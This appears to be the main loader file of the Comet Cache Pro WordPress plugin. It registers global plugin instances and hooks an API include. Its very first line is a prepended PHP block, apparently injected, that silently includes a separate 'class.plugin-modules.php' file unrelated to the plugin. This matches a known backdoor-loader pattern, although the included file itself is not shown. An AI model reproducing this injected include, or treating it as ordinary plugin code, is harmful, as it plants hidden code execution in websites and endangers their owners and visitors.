<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin.
 *
 * @since 150422 Rewrite.
 */
namespace WebSharks\CometCache\Pro;

use WebSharks\CometCache\Pro\Classes;

if (!defined('WPINC')) {
    exit('Do NOT access this file directly: '.basename(__FILE__));
}
require_once __DIR__.'/stub.php';

if (!Classes\Conflicts::check()) {
    $GLOBALS[GLOBAL_NS]     = new Classes\Plugin();
    $GLOBALS['zencache']    = $GLOBALS[GLOBAL_NS]; // Back compat.
    $GLOBALS['quick_cache'] = $GLOBALS[GLOBAL_NS]; // Back compat.

    add_action('plugins_loaded', function () {
        require_once __DIR__.'/api.php';
    });
}
